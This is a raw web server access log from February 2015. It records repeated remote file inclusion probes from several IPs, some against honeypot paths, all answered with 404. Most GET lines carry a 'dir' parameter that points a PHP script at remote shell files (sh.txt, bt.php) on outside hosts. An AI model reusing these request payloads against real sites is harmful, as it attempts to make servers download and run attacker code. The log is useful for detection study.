71.6.150.241 - - [15/Feb/2015:19:44:08 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [15/Feb/2015:19:44:08 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [15/Feb/2015:19:44:10 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
176.31.252.38 - - [15/Feb/2015:19:44:23 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:19:44:24 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:19:44:25 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:19:44:26 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:19:44:30 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [15/Feb/2015:19:44:32 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [15/Feb/2015:19:44:32 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [15/Feb/2015:19:44:33 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [15/Feb/2015:19:44:38 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [15/Feb/2015:19:44:39 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [15/Feb/2015:19:44:40 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [15/Feb/2015:19:44:41 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [15/Feb/2015:19:44:57 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
176.31.252.38 - - [15/Feb/2015:19:44:59 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
176.31.252.38 - - [15/Feb/2015:19:45:06 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
71.6.150.241 - - [15/Feb/2015:19:45:11 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
71.6.150.241 - - [15/Feb/2015:19:45:12 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
71.6.150.241 - - [15/Feb/2015:19:45:12 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
71.6.150.241 - - [15/Feb/2015:19:45:14 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
71.6.150.241 - - [15/Feb/2015:19:45:14 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [15/Feb/2015:19:45:15 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [15/Feb/2015:19:45:16 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [15/Feb/2015:19:45:17 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [15/Feb/2015:19:45:18 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
71.6.150.241 - - [15/Feb/2015:19:45:19 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
71.6.150.241 - - [15/Feb/2015:19:45:20 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
71.6.150.241 - - [15/Feb/2015:19:45:21 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
203.58.0.155 - - [15/Feb/2015:19:45:22 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
112.218.68.155 - - [15/Feb/2015:19:45:23 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
203.58.0.155 - - [15/Feb/2015:19:45:23 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
203.58.0.155 - - [15/Feb/2015:19:45:24 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
112.218.68.155 - - [15/Feb/2015:19:45:24 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
112.218.68.155 - - [15/Feb/2015:19:45:25 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
203.58.0.155 - - [15/Feb/2015:19:45:25 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
80.68.145.110 - - [15/Feb/2015:19:45:27 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
112.218.68.155 - - [15/Feb/2015:19:45:28 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
80.68.145.110 - - [15/Feb/2015:19:45:28 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
80.68.145.110 - - [15/Feb/2015:19:45:29 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
180.179.212.185 - - [15/Feb/2015:19:45:29 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
80.68.145.110 - - [15/Feb/2015:19:45:30 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
180.179.212.185 - - [15/Feb/2015:19:45:30 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
180.179.212.185 - - [15/Feb/2015:19:45:31 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
112.218.68.155 - - [15/Feb/2015:19:45:31 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
112.218.68.155 - - [15/Feb/2015:19:45:33 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
203.58.0.155 - - [15/Feb/2015:19:45:33 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
180.179.212.185 - - [15/Feb/2015:19:45:33 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
80.68.145.110 - - [15/Feb/2015:19:45:33 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
112.218.68.155 - - [15/Feb/2015:19:45:34 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
203.58.0.155 - - [15/Feb/2015:19:45:35 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
80.68.145.110 - - [15/Feb/2015:19:45:35 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
80.68.145.110 - - [15/Feb/2015:19:45:35 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
112.218.68.155 - - [15/Feb/2015:19:45:35 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
203.58.0.155 - - [15/Feb/2015:19:45:35 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
80.68.145.110 - - [15/Feb/2015:19:45:36 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
203.58.0.155 - - [15/Feb/2015:19:45:37 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
203.58.0.155 - - [15/Feb/2015:19:45:38 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
203.58.0.155 - - [15/Feb/2015:19:45:40 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
203.58.0.155 - - [15/Feb/2015:19:45:40 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
203.58.0.155 - - [15/Feb/2015:19:45:42 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
180.179.212.185 - - [15/Feb/2015:19:45:47 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
180.179.212.185 - - [15/Feb/2015:19:45:48 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
180.179.212.185 - - [15/Feb/2015:19:45:49 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
180.179.212.185 - - [15/Feb/2015:19:45:50 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
80.68.145.110 - - [15/Feb/2015:19:45:54 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [15/Feb/2015:19:45:55 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
80.68.145.110 - - [15/Feb/2015:19:45:55 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
80.68.145.110 - - [15/Feb/2015:19:45:55 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [15/Feb/2015:19:45:56 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
176.31.252.38 - - [15/Feb/2015:19:45:56 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
80.68.145.110 - - [15/Feb/2015:19:45:57 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [15/Feb/2015:19:45:58 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
203.58.0.155 - - [15/Feb/2015:19:46:20 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;bingbot/2.0;+http://www.bing.com/bingbot.htm)" 
203.58.0.155 - - [15/Feb/2015:19:46:22 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;bingbot/2.0;+http://www.bing.com/bingbot.htm)" 
203.58.0.155 - - [15/Feb/2015:19:46:22 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;bingbot/2.0;+http://www.bing.com/bingbot.htm)" 
203.58.0.155 - - [15/Feb/2015:19:46:24 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;bingbot/2.0;+http://www.bing.com/bingbot.htm)" 
80.68.145.110 - - [15/Feb/2015:19:47:03 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
80.68.145.110 - - [15/Feb/2015:19:47:05 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
80.68.145.110 - - [15/Feb/2015:19:47:05 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
80.68.145.110 - - [15/Feb/2015:19:47:06 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
176.31.252.38 - - [15/Feb/2015:19:47:13 -0800] "GET /honeypot//skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:19:47:14 -0800] "GET /honeypot//skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:19:47:14 -0800] "POST /honeypot//skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:19:47:15 -0800] "POST /honeypot//skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:19:47:15 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:19:47:17 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:19:47:17 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [15/Feb/2015:19:47:18 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
71.6.150.241 - - [15/Feb/2015:19:55:58 -0800] "GET /honeypot//skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [15/Feb/2015:19:55:59 -0800] "GET /honeypot//skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [15/Feb/2015:19:56:00 -0800] "POST /honeypot//skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [15/Feb/2015:19:56:01 -0800] "POST /honeypot//skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [15/Feb/2015:19:56:01 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [15/Feb/2015:19:56:02 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [15/Feb/2015:19:56:02 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [15/Feb/2015:19:56:03 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [15/Feb/2015:19:58:04 -0800] "GET /honeypot//skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
176.31.252.38 - - [15/Feb/2015:19:58:05 -0800] "GET /honeypot//skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
176.31.252.38 - - [15/Feb/2015:19:58:05 -0800] "POST /honeypot//skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
176.31.252.38 - - [15/Feb/2015:19:58:06 -0800] "POST /honeypot//skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
176.31.252.38 - - [15/Feb/2015:19:58:07 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
176.31.252.38 - - [15/Feb/2015:19:58:08 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
176.31.252.38 - - [15/Feb/2015:19:58:08 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
176.31.252.38 - - [15/Feb/2015:19:58:09 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
176.31.252.38 - - [15/Feb/2015:20:08:14 -0800] "GET /honeypot//skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
176.31.252.38 - - [15/Feb/2015:20:08:15 -0800] "GET /honeypot//skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
176.31.252.38 - - [15/Feb/2015:20:08:16 -0800] "POST /honeypot//skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
176.31.252.38 - - [15/Feb/2015:20:08:17 -0800] "POST /honeypot//skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
176.31.252.38 - - [15/Feb/2015:20:08:17 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
176.31.252.38 - - [15/Feb/2015:20:08:18 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
176.31.252.38 - - [15/Feb/2015:20:08:18 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
176.31.252.38 - - [15/Feb/2015:20:08:19 -0800] "POST //skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
176.31.252.38 - - [15/Feb/2015:20:19:54 -0800] "GET /honeypot//skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
176.31.252.38 - - [15/Feb/2015:20:19:55 -0800] "GET /honeypot//skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
176.31.252.38 - - [15/Feb/2015:20:19:55 -0800] "POST /honeypot//skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
176.31.252.38 - - [15/Feb/2015:20:19:56 -0800] "POST /honeypot//skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
176.31.252.38 - - [15/Feb/2015:20:19:57 -0800] "GET //skin/zero_vote/ask_password.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
